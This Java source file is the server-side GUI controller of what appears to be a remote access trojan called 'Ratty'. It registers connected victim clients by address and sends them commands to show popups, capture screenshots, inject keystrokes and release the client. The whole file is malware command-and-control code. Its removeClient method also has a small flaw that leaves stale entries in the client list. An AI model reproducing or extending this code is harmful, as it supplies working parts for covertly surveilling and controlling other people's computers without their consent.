package de.sogomn.rat.server.gui;

import java.awt.event.KeyEvent;
import java.util.ArrayList;

import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.IClientObserver;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.KeyEventPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.IServerObserver;

public final class ServerGuiController implements IServerObserver, IClientObserver, IGuiController {
	
	private RattyGui gui;
	
	private ArrayList<ServerClient> clients;
	private long nextId;
	
	public ServerGuiController(final RattyGui gui) {
		this.gui = gui;
		
		clients = new ArrayList<ServerClient>();
		
		gui.setController(this);
	}
	
	private ServerClient getClient(final long id) {
		for (final ServerClient client : clients) {
			if (client.id == id) {
				return client;
			}
		}
		
		return null;
	}
	
	private ServerClient getClient(final ActiveClient client) {
		for (final ServerClient serverClient : clients) {
			if (serverClient.client == client) {
				return serverClient;
			}
		}
		
		return null;
	}
	
	@Override
	public void packetReceived(final ActiveClient client, final IPacket packet) {
		packet.execute(client);
	}
	
	@Override
	public void disconnected(final ActiveClient client) {
		removeClient(client);
	}
	
	@Override
	public void clientConnected(final ActiveServer server, final ActiveClient client) {
		addClient(client);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		System.out.println("Server closed");
	}
	
	/*TODO: MAKE DYNAMIC*/
	@Override
	public void userInput(final String actionCommand) {
		final long lastIdClicked = gui.getLastIdClicked();
		final ActiveClient client = getClient(lastIdClicked).client;
		
		IPacket packet = null;
		
		switch (actionCommand) {
		case RattyGui.POPUP:
			packet = new PopupPacket("Test message");
			
			break;
		case RattyGui.SCREENSHOT:
			packet = new ScreenshotPacket(0, 0, 500, 500);
			
			break;
		case RattyGui.KEY_EVENT:
			packet = new KeyEventPacket(KeyEvent.VK_G, KeyEventPacket.TYPE);
			
			break;
		case RattyGui.FREE:
			final FreePacket freePacket = new FreePacket();
			
			client.sendPacket(freePacket);
			removeClient(client);
			
			break;
		}
		
		if (packet != null) {
			client.sendPacket(packet);
		}
	}
	
	public void addClient(final ActiveClient client) {
		final long id = nextId++;
		final ServerClient serverClient = new ServerClient(id, client);
		
		client.setObserver(this);
		clients.add(serverClient);
		client.start();
		
		gui.addRow(id, "Unknown", client.getAddress(), "NA", "NA");
	}
	
	public void removeClient(final ActiveClient client) {
		final long id = getClient(client).id;
		
		client.setObserver(null);
		client.close();
		clients.remove(client);
		
		gui.removeRow(id);
	}
	
	private final class ServerClient {
		
		final long id;
		final ActiveClient client;
		
		public ServerClient(final long id, final ActiveClient client) {
			this.id = id;
			this.client = client;
		}
		
	}
	
}
